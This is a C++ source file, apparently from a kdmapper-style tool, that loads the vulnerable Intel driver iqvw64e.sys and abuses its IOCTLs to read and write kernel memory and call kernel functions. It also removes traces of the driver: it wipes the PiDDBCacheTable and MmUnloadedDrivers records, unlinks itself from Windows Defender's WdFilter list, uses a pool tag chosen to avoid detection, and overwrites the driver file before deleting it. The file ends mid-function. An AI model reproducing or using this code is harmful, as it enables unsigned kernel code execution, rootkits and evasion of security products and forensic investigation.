#include "intel_driver.hpp"

ULONG64 intel_driver::ntoskrnlAddr = 0;
char intel_driver::driver_name[100] = {};
uintptr_t PiDDBLockPtr;
uintptr_t PiDDBCacheTablePtr;

std::wstring intel_driver::GetDriverNameW() {
	std::string t(intel_driver::driver_name);
	std::wstring name(t.begin(), t.end());
	return name;
}

std::wstring intel_driver::GetDriverPath() {
	std::wstring temp = kdmapper_utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

bool intel_driver::IsRunning() {
	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

HANDLE intel_driver::Load() {
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
	if (intel_driver::IsRunning()) {
		Log("[-] \\Device\\Nal is already in use.");
		return INVALID_HANDLE_VALUE;
	}

	//Randomize name for log in registry keys, usn jornal and other shits
	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	Log("[<] Loading vulnerable driver, Name: %ls", GetDriverNameW());

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log("[-] Can't find TEMP folder");
		return INVALID_HANDLE_VALUE;
	}

	_wremove(driver_path.c_str());

	if (!kdmapper_utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		Log("[-] Failed to create vulnerable driver file");
		return INVALID_HANDLE_VALUE;
	}

	if (!service::RegisterAndStart(driver_path)) {
		Log("[-] Failed to register and start service for the vulnerable driver");
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	HANDLE result = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!result || result == INVALID_HANDLE_VALUE)
	{
		Log("[-] Failed to load driver iqvw64e.sys");
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	ntoskrnlAddr = kdmapper_utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		Log("[-] Failed to get ntoskrnl.exe");
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearPiDDBCacheTable(result)) {
		Log("[-] Failed to ClearPiDDBCacheTable");
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearKernelHashBucketList(result)) {
		Log("[-] Failed to ClearKernelHashBucketList");
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
		Log("[!] Failed to ClearMmUnloadedDrivers");
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearWdFilterDriverList(result)) {
		Log("[!] Failed to ClearWdFilterDriverList");
		//intel_driver::Unload(result);
		//return INVALID_HANDLE_VALUE;
	}

	return result;
}

bool intel_driver::Unload(HANDLE device_handle) {
	Log("[<] Unloading vulnerable driver");

	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
		CloseHandle(device_handle);
	}

	if (!service::StopAndRemove(GetDriverNameW()))
		return false;

	std::wstring driver_path = GetDriverPath();

	//Destroy disk information before unlink from disk to prevent any recover of the file
	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	int newFileLen = sizeof(intel_driver_resource::driver) + ((long long)rand() % 2348767 + 56725);
	BYTE* randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		Log("[!] Error dumping shit inside the disk");
	}
	else {
		Log("[+] Vul driver data destroyed before unlink");
	}
	file_ofstream.close();
	delete[] randomData;

	//unlink the file
	if (_wremove(driver_path.c_str()) != 0)
		return false;

	return true;
}

bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address) {
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
		Log("[-] Failed to translate virtual address %p", reinterpret_cast<void*>(address));
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(device_handle, physical_address, size);

	if (!mapped_physical_memory) {
		Log("[-] Failed to map IO space of %p", reinterpret_cast<void*>(physical_address));
		return false;
	}

	bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);

#if defined(_DEBUG)
	UnmapIoSpace(device_handle, mapped_physical_memory, size);
#else
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		Log("[!] Failed to unmap IO space of physical address %p", reinterpret_cast<void*>(physical_address));
#endif


	return result;
}

uint64_t intel_driver::IoAllocateMdl(HANDLE device_handle, PVOID VirtualAddress, ULONG Length, BOOLEAN SecondaryBuffer, BOOLEAN ChargeQuota, PVOID pIrp)
{
	static uint64_t kernel_IoAllocateMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "IoAllocateMdl");

	if (!kernel_IoAllocateMdl)
	{
		Log("[!] Failed to find IoAllocateMdl");
		return 0;
	}

	uint64_t allocated_mdl= 0;

	if (!CallKernelFunction(device_handle, &allocated_mdl, kernel_IoAllocateMdl, VirtualAddress, Length, SecondaryBuffer, ChargeQuota, pIrp))
		return 0;

	return allocated_mdl;
}

void intel_driver::MmBuildMdlForNonPagedPool(HANDLE device_handle, PVOID pMdl)
{
	static uint64_t kernel_MmBuildMdlForNonPagedPool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmBuildMdlForNonPagedPool");

	if (!kernel_MmBuildMdlForNonPagedPool)
	{
		Log("[!] Failed to find MmBuildMdlForNonPagedPool");
		return;
	}

	CallKernelFunction<void>(device_handle, 0, kernel_MmBuildMdlForNonPagedPool);
}

void intel_driver::MmProbeAndLockPages(HANDLE device_handle, PVOID MemoryDescriptorList, nt::KPROCESSOR_MODE AccessMode, LOCK_OPERATION LockOperation)
{
	static uint64_t kernel_MmProbeAndLockPages = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmProbeAndLockPages");

	if (!kernel_MmProbeAndLockPages)
	{
		Log("[!] Failed to find MmProbeAndLockPages");
		return;
	}

	CallKernelFunction<void>(device_handle, 0, kernel_MmProbeAndLockPages, MemoryDescriptorList, AccessMode, LockOperation);
}

/*added by psec*/
uint64_t intel_driver::MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes)
{
	static uint64_t kernel_MmAllocatePagesForMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmAllocatePagesForMdl");

	if (!kernel_MmAllocatePagesForMdl)
	{
		Log("[!] Failed to find MmAlocatePagesForMdl");
		return 0;
	}

	uint64_t allocated_pages = 0;

	if (!CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocatePagesForMdl, LowAddress, HighAddress, SkipBytes, TotalBytes))
		return 0;

	return allocated_pages;
}

uint64_t intel_driver::MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority)
{
	static uint64_t kernel_MmMapLockedPagesSpecifyCache = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmMapLockedPagesSpecifyCache");

	if (!kernel_MmMapLockedPagesSpecifyCache)
	{
		Log("[!] Failed to find MmMapLockedPagesSpecifyCache");
		return 0;
	}

	uint64_t starting_address = 0;

	if (!CallKernelFunction(device_handle, &starting_address, kernel_MmMapLockedPagesSpecifyCache, pmdl, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority))
		return 0;

	return starting_address;
}

bool intel_driver::MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect)
{
	static uint64_t kernel_MmProtectMdlSystemAddress = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmProtectMdlSystemAddress");

	if (!kernel_MmProtectMdlSystemAddress)
	{
		Log("[!] Failed to find MmProtectMdlSystemAddress");
		return 0;
	}

	NTSTATUS status;

	if (!CallKernelFunction(device_handle, &status, kernel_MmProtectMdlSystemAddress, MemoryDescriptorList, NewProtect))
		return 0;

	return NT_SUCCESS(status);
}


bool intel_driver::MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl)
{
	static uint64_t kernel_MmUnmapLockedPages = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmUnmapLockedPages");

	if (!kernel_MmUnmapLockedPages)
	{
		Log("[!] Failed to find MmUnmapLockedPages");
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmUnmapLockedPages, BaseAddress, pmdl);
}

bool intel_driver::MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList)
{
	static uint64_t kernel_MmFreePagesFromMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmFreePagesFromMdl");

	if (!kernel_MmFreePagesFromMdl)
	{
		Log("[!] Failed to find MmFreePagesFromMdl");
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmFreePagesFromMdl, MemoryDescriptorList);
}
/**/

uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");

	if (!kernel_ExAllocatePool) {
		Log("[!] Failed to find ExAllocatePool");
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE')) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
		return 0;

	return allocated_pool;
}

uint64_t intel_driver::MmAllocateContiguousMemory(HANDLE device_handle, SIZE_T NumberOfBytes, LARGE_INTEGER HighestAcceptableAddress)
{
	if (!NumberOfBytes)
		return 0;

	static uint64_t kernel_MmAllocateContiguousMemory = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmAllocateContiguousMemory");

	if (!kernel_MmAllocateContiguousMemory) {
		Log("[!] Failed to find MmAllocateContiguousMemory");
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_MmAllocateContiguousMemory, NumberOfBytes, HighestAcceptableAddress))
		return 0;

	return allocated_pool;
}

uint64_t __fastcall intel_driver::MmAllocateContiguousNodeMemory(HANDLE device_handle, SIZE_T NumberOfBytes, LARGE_INTEGER LowestAcceptableAddress, LARGE_INTEGER HighestAcceptableAddress, LARGE_INTEGER BoundaryAddressMultiple, ULONG Protect, ULONG PreferredNode)
{
	if (!NumberOfBytes)
		return 0;

	static uint64_t kernel_MmAllocateContiguousNodeMemory = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmAllocateContiguousNodeMemory");

	if (!kernel_MmAllocateContiguousNodeMemory) {
		Log("[!] Failed to find MmAllocateContiguousNodeMemory");
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (CallKernelFunction(device_handle, &allocated_pool, kernel_MmAllocateContiguousNodeMemory, NumberOfBytes, LowestAcceptableAddress, HighestAcceptableAddress, BoundaryAddressMultiple, Protect, PreferredNode))
		return 0;

	return allocated_pool;
}

uint64_t intel_driver::MmAllocateContiguousMemorySpecifyCacheNode(HANDLE device_handle, SIZE_T NumberOfBytes, LARGE_INTEGER LowestAcceptableAddress, LARGE_INTEGER HighestAcceptableAddress, LARGE_INTEGER BoundaryAddressMultiple, MEMORY_CACHING_TYPE CacheType, ULONG PreferredNode)
{
	if (!NumberOfBytes)
		return 0;

	static uint64_t kernel_MmAllocateContiguousMemorySpecifyCacheNode = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmAllocateContiguousMemorySpecifyCacheNode");

	if (!kernel_MmAllocateContiguousMemorySpecifyCacheNode) {
		Log("[!] Failed to find MmAllocateContiguousMemorySpecifyCacheNode");
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_MmAllocateContiguousMemorySpecifyCacheNode, NumberOfBytes, LowestAcceptableAddress, HighestAcceptableAddress, BoundaryAddressMultiple, CacheType, PreferredNode))
		return 0;

	return allocated_pool;
}

bool intel_driver::FreePool(HANDLE device_handle, uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExFreePool");

	if (!kernel_ExFreePool) {
		Log("[!] Failed to find ExAllocatePool");
		return 0;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				// Wrong function address?
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == 0)
	{
		if (buffer != 0)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == device_handle)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;

	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		Log("[!] Failed to find device_object");
		return false;
	}

	uint64_t driver_object = 0;

	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		Log("[!] Failed to find driver_object");
		return false;
	}

	uint64_t driver_section = 0;

	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		Log("[!] Failed to find driver_section");
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		Log("[!] Failed to find driver name");
		return false;
	}

	wchar_t* unloadedName = new wchar_t[(ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL];
	memset(unloadedName, 0, us_driver_base_dll_name.Length + sizeof(wchar_t));

	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName, us_driver_base_dll_name.Length)) {
		Log("[!] Failed to read driver name");
		return false;
	}

	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver

	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		Log("[!] Failed to write driver name length");
		return false;
	}

	Log("[+] MmUnloadedDrivers Cleaned: %x", unloadedName);

	delete[] unloadedName;

	return true;
}

bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {
	auto WdFilter = kdmapper_utils::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) {
		Log("[!] Failed to find WdFilter.sys");
		//driver::Unload(device_handle);
		return false;
	}

	auto g_table = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", (char*)"xxx????xx");
	if (!g_table) {
		Log("[!] Failed to find g_table");
		//driver::Unload(device_handle);
		return false;
	}

	g_table = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)g_table, 3, 7);
	uintptr_t g_table_Head = g_table - 0x8;

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY*
	{
		LIST_ENTRY* Entry;
		if (!ReadMemory(device_handle, Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
	};

	for (LIST_ENTRY* Entry = ReadListEntry(g_table_Head); Entry
		!= ReadListEntry((g_table_Head)+(offsetof(struct _LIST_ENTRY, Blink)));
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		UNICODE_STRING Unicode_String;
		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING)))
		{
			wchar_t* ImageName = new wchar_t[(ULONG64)Unicode_String.Length / 2ULL + 1ULL];
			memset(ImageName, 0, Unicode_String.Length + sizeof(wchar_t));

			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName, Unicode_String.Length)) {

				if (wcsstr(ImageName, intel_driver::GetDriverNameW().c_str()))
				{
					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));
					WriteMemory(device_handle, uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), NextEntry, sizeof(LIST_ENTRY));
					WriteMemory(device_handle, uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), PrevEntry, sizeof(LIST_ENTRY));

					delete[] ImageName;
					break;
				}
			}

			Log("[+] WdFilterDriverList Cleaned: %x", ImageName);
			delete[] ImageName;
		}
	}

	return true;
}

PVOID intel_driver::ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(device_handle, Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
		return nullptr;
	}
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");

	if (!kernel_ExAcquireResourceExclusiveLite) {
		Log("[!] Failed to find ExAcquireResourceExclusiveLite");
		return 0;
	}

	BOOLEAN out;

	return (CallKernelFunction(device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExReleaseResourceLite");

	if (!kernel_ExReleaseResourceLite) {
		Log("[!] Failed to find ExReleaseResourceLite");
		return false;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log("[!] Failed to find RtlDeleteElementGenericTableAvl");
		return false;
	}

	BOOLEAN out;

	return (CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log("[!] Failed to find RtlLookupElementGenericTableAvl");
		return nullptr;
	}

	PVOID out;

	if (!CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer))
		return 0;

	return out;
}


intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {
	
	PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable, (PVOID)&localentry);
}

bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver

	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", (char*)"xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", (char*)"xxxxxx"); // 66 03 D2 48 8D 0D

	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as posible
		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", (char*)"xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
		if (PiDDBLockPtr == NULL) {
			Log("[-] Warning PiDDBLock not found");
			return false;
		}
		Log("[+] PiDDBLock found with second pattern");
		PiDDBLockPtr += 16; //second pattern offset
	}
	else {
		PiDDBLockPtr += 28; //first pattern offset
	}

	if (PiDDBCacheTablePtr == NULL) {
		Log("[-] Warning PiDDBCacheTable not found");
		return false;
	}

	Log("[+] PiDDBLock Ptr %p", PiDDBLockPtr);
	Log("[+] PiDDBCacheTable Ptr %p", PiDDBCacheTablePtr);

	PVOID PiDDBLock = ResolveRelativeAddress(device_handle, (PVOID)PiDDBLockPtr, 3, 7);
